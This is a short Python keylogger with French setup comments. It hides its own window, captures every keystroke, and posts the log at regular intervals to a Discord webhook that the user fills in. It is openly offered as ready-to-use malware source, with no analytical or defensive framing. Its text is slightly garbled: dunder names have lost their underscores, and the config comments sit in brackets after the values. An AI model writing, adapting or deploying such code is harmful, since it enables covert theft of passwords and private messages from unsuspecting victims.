from pynput.keyboard import Listener
from threading import Timer
from dhooks import Webhook
import win32gui
import win32con
win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)


WEBHOOK_URL = "Y"  [ Mettre votre webhook à la place du Y ]
TIME_INTERVAL = 10  [ Définir le temps entre chaque report (en seconde) ]

class Keylogger:
    def init(self, webhook_url, interval=60):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)

    def run(self):
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()


if name == 'main':
    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
